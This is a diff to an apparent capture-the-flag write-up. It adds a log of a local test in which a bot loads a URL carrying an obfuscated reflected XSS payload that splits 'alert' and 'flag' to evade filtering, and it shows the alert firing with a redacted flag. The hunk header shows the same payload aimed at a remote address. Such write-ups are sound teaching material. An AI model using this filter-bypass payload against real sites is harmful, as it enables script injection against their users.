@@ -198,6 +198,13 @@ http://34.170.146.252:59059/?username=%3Cscript%3Ewindow%5B%27al%27%2B%27ert%27%
 <img width="338" height="93" alt="image" src="https://github.com/user-attachments/assets/715a0af5-d619-4c09-9019-ef447fc120fd" />
 
 
+※http://localhost:3000
+docker compose up
+web-1  | Start visiting: http://localhost:3000/?username=%3Cscript%3Ewindow%5B'al'%2B'ert'%5D(eval('fl'%2B'ag'))%3C%2Fscript%3E
+web-1  | Dialog message: Alpaca{REDACTED}
+web-1  | Dialog type: alert
+web-1  | End visiting: http://localhost:3000/?username=%3Cscript%3Ewindow%5B'al'%2B'ert'%5D(eval('fl'%2B'ag'))%3C%2Fscript%3E
+
 
 
 
